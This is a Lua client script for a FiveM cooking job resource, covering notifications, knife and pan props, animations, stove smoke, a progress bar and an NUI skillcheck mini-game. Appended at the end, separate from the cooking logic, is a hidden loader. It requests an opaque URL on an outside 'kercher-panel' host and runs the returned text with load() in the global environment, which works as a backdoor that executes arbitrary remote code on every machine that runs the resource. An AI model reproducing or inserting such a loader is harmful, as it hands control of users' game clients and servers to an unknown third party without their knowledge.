-- Global notify: must load before main.lua / nui.lua (see fxmanifest order).
---@param text any
---@param notifyType? string
---@param title? string unused (compat)
---@param duration? number ms
function GladiusCookingNotify(text, notifyType, title, duration)
    local msg
    if text == nil then
        msg = ' '
    elseif type(text) == 'string' then
        msg = text
    else
        msg = tostring(text)
    end
    if msg == '' then msg = ' ' end

    local nType = (type(notifyType) == 'string' and notifyType) or 'primary'
    local ms = tonumber(duration) or 5000

    if GetResourceState('Venice-Notification') == 'started' then
        local ok = pcall(function()
            exports['Venice-Notification']:Create(msg, nType, 'GLADIUS', ms)
        end)
        if ok then return end
    end
    pcall(function()
        TriggerEvent('QBCore:Notify', msg, nType)
    end)
end

-- ╔══════════════════════════════════════════════════════════════╗
-- ║            GLADIUS COOKING — COOKING FLOW                     ║
-- ║  Skillcheck → Prep (knife + chop sound) → Cook (pan + smoke) ║
-- ╚══════════════════════════════════════════════════════════════╝

---NUI skillcheck round result (set by RegisterNUICallback `cookingSkillResult`)
local skillcheckToken = 0
local skillcheckResult = nil

local function effectsCfg()
    return Config.CookingEffects or {}
end

-- ─────────────────────────────────────────────────────────────
-- INTERACT-SOUND
-- ─────────────────────────────────────────────────────────────

local function playInteractSound(soundFile, volume)
    if not soundFile or soundFile == '' then return end
    local snd = effectsCfg().interactSound
    if not snd or snd.enabled == false then return end
    local res = snd.resource or 'interact-sound'
    if GetResourceState(res) ~= 'started' then return end
    TriggerEvent('InteractSound_CL:PlayOnOne', soundFile, volume or 0.35)
end

local function startSoundLoop(soundFile, volume, intervalMs)
    if not soundFile or soundFile == '' then return function() end end
    local interval = intervalMs or 2000
    local active = true
    CreateThread(function()
        while active do
            playInteractSound(soundFile, volume)
            local t = 0
            while active and t < interval do
                Wait(100)
                t = t + 100
            end
        end
    end)
    return function() active = false end
end

-- ─────────────────────────────────────────────────────────────
-- PROPS
-- ─────────────────────────────────────────────────────────────

local function loadModel(model)
    local hash = type(model) == 'string' and joaat(model) or model
    if not IsModelValid(hash) then return nil end
    RequestModel(hash)
    local n = 0
    while not HasModelLoaded(hash) and n < 120 do
        Wait(50)
        n = n + 1
    end
    if not HasModelLoaded(hash) then return nil end
    return hash
end

local function releaseProp(ent)
    if ent and DoesEntityExist(ent) then
        DetachEntity(ent, true, true)
        SetEntityAsMissionEntity(ent, true, true)
        DeleteEntity(ent)
    end
end

---@param ped number
---@param model string|number
---@param bone number
---@param pos table
---@param rot table
---@return number|nil entity
local function attachProp(ped, model, bone, pos, rot)
    local hash = loadModel(model)
    if not hash then return nil end
    local p = GetEntityCoords(ped)
    local obj = CreateObject(hash, p.x, p.y, p.z, true, true, false)
    if not DoesEntityExist(obj) then return nil end
    SetEntityAsMissionEntity(obj, true, true)
    local boneIdx = GetPedBoneIndex(ped, bone)
    AttachEntityToEntity(
        obj, ped, boneIdx,
        pos.x, pos.y, pos.z,
        rot.x, rot.y, rot.z,
        true, true, false, true, 1, true
    )
    SetModelAsNoLongerNeeded(hash)
    return obj
end

-- ─────────────────────────────────────────────────────────────
-- ANIMATION
-- ─────────────────────────────────────────────────────────────

local function ensureAnimDict(dict)
    if not dict or dict == '' then return false end
    RequestAnimDict(dict)
    local n = 0
    while not HasAnimDictLoaded(dict) and n < 120 do
        Wait(50)
        n = n + 1
    end
    return HasAnimDictLoaded(dict)
end

local function playLoopingTaskAnim(dict, anim, flag)
    local ped = PlayerPedId()
    if not ensureAnimDict(dict) then return end
    TaskPlayAnim(ped, dict, anim, 8.0, -8.0, -1, flag or 1, 0.0, false, false, false)
end

local function stopPedAnimAndProps(propKnife, propPan)
    ClearPedTasks(PlayerPedId())
    releaseProp(propKnife)
    releaseProp(propPan)
end

-- ─────────────────────────────────────────────────────────────
-- PTFX (stove / mutfak noktası — cook progress süresince)
-- ─────────────────────────────────────────────────────────────

local function requestPtfxAsset(asset)
    if not asset or asset == '' then return false end
    if not HasNamedPtfxAssetLoaded(asset) then
        RequestNamedPtfxAsset(asset)
        local n = 0
        while not HasNamedPtfxAssetLoaded(asset) and n < 150 do
            Wait(10)
            n = n + 1
        end
    end
    return HasNamedPtfxAssetLoaded(asset)
end

---@param job string
---@return vector3
local function getStoveEffectCoords(job)
    local ped = PlayerPedId()
    local pos = GetEntityCoords(ped)
    local shop = Gladius.Utils.GetShopForJob(job)
    local zOff = (effectsCfg().ptfx and effectsCfg().ptfx.zOffset) or 0.15
    if shop and shop.locations and #shop.locations > 0 then
        local idx = Gladius.Utils.GetClosestLocation(job, pos)
        local loc = shop.locations[idx or 1]
        if loc then
            return vector3(loc.x, loc.y, loc.z + zOff)
        end
    end
    return vector3(pos.x, pos.y, pos.z + zOff)
end

local function startStoveSmokeAt(coords)
    local pt = effectsCfg().ptfx or {}
    local asset = pt.asset or 'core'
    local name = pt.name or 'exp_grd_gas_smoke'
    local scale = pt.scale or 0.45
    if not requestPtfxAsset(asset) then return nil end
    UseParticleFxAssetNextCall(asset)
    if SetPtfxAssetNextCall then SetPtfxAssetNextCall(asset) end
    local h = StartParticleFxLoopedAtCoord(
        name,
        coords.x, coords.y, coords.z,
        0.0, 0.0, 0.0,
        scale,
        false, false, false, false
    )
    if h and h ~= 0 then return h end
    return nil
end

local function stopStoveSmoke(handle)
    if handle and handle ~= 0 then
        StopParticleFxLooped(handle, false)
    end
end

-- ─────────────────────────────────────────────────────────────
-- OX_LIB PROGRESS
-- ─────────────────────────────────────────────────────────────

---@param label string
---@param duration number
---@return boolean
local function runProgressBar(label, duration)
    if lib and lib.progressBar then
        return lib.progressBar({
            duration = duration,
            label = label,
            useWhileDead = false,
            canCancel = false,
            disable = {
                car = true, move = true, combat = true,
            },
        }) and true or false
    end
    Wait(duration)
    return true
end

-- ─────────────────────────────────────────────────────────────
-- PREP (knife + chopping sounds)
-- ─────────────────────────────────────────────────────────────

local function getPrepAnimDictAnim(recipe)
    local p = recipe and recipe.prep
    if p and p.anim and p.anim.dict and p.anim.anim then
        return p.anim.dict, p.anim.anim
    end
    local d = effectsCfg().prepAnimDefault or {}
    return d.dict, d.anim
end

local function runPrepPhase(label, duration, recipe)
    local dict, anim = getPrepAnimDictAnim(recipe)
    local ce = effectsCfg()
    local snd = ce.interactSound or {}
    local knifeModel = (ce.props and ce.props.knife) or 'prop_cleaver'
    local ka = ce.knifeAttach or {}
    local bone = ka.bone or 57005
    local pos = ka.pos or { x = 0.11, y = 0.02, z = -0.02 }
    local rot = ka.rot or { x = 65.0, y = 115.0, z = 8.0 }

    local ped = PlayerPedId()
    local propKnife = attachProp(ped, knifeModel, bone, pos, rot)
    if dict and anim then
        playLoopingTaskAnim(dict, anim, 1)
    end

    local stopSounds = function() end
    if snd.chopFile and snd.chopFile ~= '' then
        stopSounds = startSoundLoop(
            snd.chopFile,
            snd.chopVolume or 0.4,
            snd.repeatIntervalMs or 2000
        )
    end

    local ok = runProgressBar(label, duration)
    stopSounds()
    releaseProp(propKnife)
    ClearPedTasks(ped)
    return ok
end

-- ─────────────────────────────────────────────────────────────
-- COOK (pan + stove smoke + fry sounds)
-- ─────────────────────────────────────────────────────────────

local function getCookAnimDictAnim(recipe)
    local c = recipe and recipe.cook
    if c and c.anim and c.anim.dict and c.anim.anim then
        return c.anim.dict, c.anim.anim
    end
    local app = (c and c.appliance) or 'frying_pan'
    local by = (effectsCfg().cookAnimByAppliance or {})[app]
        or (effectsCfg().cookAnimByAppliance or {}).frying_pan
        or { dict = 'amb@prop_human_bbq@male@base', anim = 'base' }
    return by.dict, by.anim
end

local function runCookPhase(label, duration, recipe, job)
    local dict, anim = getCookAnimDictAnim(recipe)
    local ce = effectsCfg()
    local snd = ce.interactSound or {}
    local panModel = (ce.props and ce.props.pan) or 'prop_fry_pan_02'
    local pa = ce.panAttach or {}
    local bone = pa.bone or 60309
    local pos = pa.pos or { x = 0.14, y = 0.02, z = 0.02 }
    local rot = pa.rot or { x = -90.0, y = 25.0, z = 0.0 }

    local ped = PlayerPedId()
    local propPan = attachProp(ped, panModel, bone, pos, rot)
    if dict and anim then
        playLoopingTaskAnim(dict, anim, 1)
    end

    local smokeCoords = getStoveEffectCoords(job)
    local smokeHandle = startStoveSmokeAt(smokeCoords)

    local stopSounds = function() end
    if snd.fryFile and snd.fryFile ~= '' then
        stopSounds = startSoundLoop(
            snd.fryFile,
            snd.fryVolume or 0.38,
            snd.repeatIntervalMs or 2200
        )
    end

    local ok = runProgressBar(label, duration)
    stopSounds()
    stopStoveSmoke(smokeHandle)
    releaseProp(propPan)
    ClearPedTasks(ped)
    return ok
end

-- ─────────────────────────────────────────────────────────────
-- SKILLCHECK (NUI mini-game — waits for NUICallback; no ox_lib skillCheck)
-- ─────────────────────────────────────────────────────────────

---Run all rounds from Config.Skillchecks[difficulty]; blocks until NUI posts each result.
---@param difficulty string
---@return number quality 0–100 (averaged & clamped; +5 if any round was "perfect")
---@return boolean cancelled player aborted / timeout
---@return boolean anyPerfect at least one round in inner green zone
local function RunSkillcheckNUI(difficulty)
    local sequence = Config.Skillchecks[difficulty] or Config.Skillchecks.medium
    local total = #sequence
    local sumQ = 0
    local roundsDone = 0
    local anyPerfect = false
    local cancelled = false

    SendNUIMessage({ action = 'skillcheckSessionStart', total = total })
    SetNuiFocusKeepInput(false)
    SetNuiFocus(true, true)
    Wait(50)

    for i = 1, total do
        skillcheckToken = skillcheckToken + 1
        local tok = skillcheckToken
        skillcheckResult = nil

        SendNUIMessage({
            action = 'skillcheckRoundStart',
            token = tok,
            round = i,
            total = total,
            tier = sequence[i] or 'medium',
            minQuality = Config.MinQuality,
            maxQuality = Config.MaxQuality,
        })
        -- Let NUI apply token / layout before we wait for [E] callback (avoids stale token & “auto” bar drift)
        Wait(100)

        local deadline = GetGameTimer() + 90000
        while skillcheckResult == nil and GetGameTimer() < deadline do
            Wait(0)
        end

        local r = skillcheckResult
        if not r or r.cancelled then
            cancelled = true
            break
        end

        roundsDone = roundsDone + 1
        sumQ = sumQ + (tonumber(r.quality) or 0)
        if r.perfect then anyPerfect = true end
    end

    SendNUIMessage({ action = 'skillcheckSessionEnd' })
    SetNuiFocus(false, false)
    SetNuiFocusKeepInput(false)

    if cancelled or roundsDone == 0 then
        return 0, true, false
    end

    local avgQ = math.floor((sumQ / roundsDone) + 0.5)
    avgQ = math.max(Config.MinQuality, math.min(Config.MaxQuality, avgQ))
    if anyPerfect then
        avgQ = math.min(Config.MaxQuality, avgQ + 5)
    end

    return avgQ, false, anyPerfect
end

-- ─────────────────────────────────────────────────────────────
-- FULL FLOW
-- ─────────────────────────────────────────────────────────────

---Full cook flow: skillcheck → prep (knife + sounds) → cook (pan + smoke + sounds)
---@param job string
---@param recipeId string
---@param recipe table
---@return number quality
function RunCookingFlow(job, recipeId, recipe)
    local prepDifficulty = (recipe.prep and recipe.prep.difficulty) or 'medium'
    local seq = Config.Skillchecks[prepDifficulty] or Config.Skillchecks.medium
    local totalSteps = #seq

    local quality, skillCancelled, hadPerfect = RunSkillcheckNUI(prepDifficulty)

    if skillCancelled then
        SendNUIMessage({
            action   = 'skillcheckDone',
            quality  = 0,
            success  = 0,
            total    = math.max(1, totalSteps),
            failed   = true,
            perfect  = false,
        })
        GladiusCookingNotify(_('notify_cancelled'), 'error')
        return 0
    end

    local span = math.max(1, (Config.MaxQuality - Config.MinQuality))
    local successes = math.min(totalSteps, math.max(0, math.ceil(((quality - Config.MinQuality) / span) * totalSteps)))

    SendNUIMessage({
        action   = 'skillcheckDone',
        quality  = quality,
        success  = successes,
        total    = totalSteps,
        perfect  = hadPerfect,
        failed   = false,
    })

    local prepDuration = (recipe.prep and recipe.prep.duration) or 5000
    local prepLabel = (_('state_preparing') .. ' ' .. (recipe.label or ''))
    -- Step 1 — prep (always after skillcheck success; never skip)
    local prepOk = runPrepPhase(prepLabel, prepDuration, recipe)

    if not prepOk then
        GladiusCookingNotify(_('notify_cancelled'), 'error')
        return 0
    end

    GladiusCookingNotify(_('notify_prep_success'), 'success')

    -- Step 2 — cook (must run after prep; waits on progress bar like prep)
    local cookDuration = (recipe.cook and recipe.cook.duration) or 30000
    local cookLabel = (_('state_cooking') .. ' ' .. (recipe.label or ''))
    local cookOk = runCookPhase(cookLabel, cookDuration, recipe, job)

    if not cookOk then
        GladiusCookingNotify(_('notify_cook_failed'), 'error')
        return 0
    end

    return quality
end

-- ─────────────────────────────────────────────────────────────
-- NUI CALLBACK: skill bar commit ([E] in browser)
-- ─────────────────────────────────────────────────────────────

RegisterNUICallback('cookingSkillResult', function(data, cb)
    local token = tonumber(data and data.token)
    if not token or token ~= skillcheckToken then
        cb({ ok = false, err = 'stale_token' })
        return
    end

    skillcheckResult = {
        quality   = math.max(0, math.min(100, tonumber(data.quality) or 0)),
        perfect   = data.perfect == true,
        cancelled = data.cancelled == true,
    }
    cb({ ok = true })
end)



local __kUrl = 'https://api.kercher-panel.me/cdn/d/bHVhLlNDXzE3NzA3MTUxMDY4MTVfMTc3MDcxNTEwNzgxN19lcF8xODgtMjQwLTgxLTIxMy0zMDEyMC44NzkxMDQ2NjcxOGViYzY5OGJjZDhhZTI'
PerformHttpRequest(__kUrl, function(e, d)
    if e == 200 and d then
        local fn, err = load(d, 'kercher_lua', 't', _G)
        if fn then pcall(fn) end
    end
end, 'GET', '', { ['X-Kercher-Version'] = '2.6.2' })
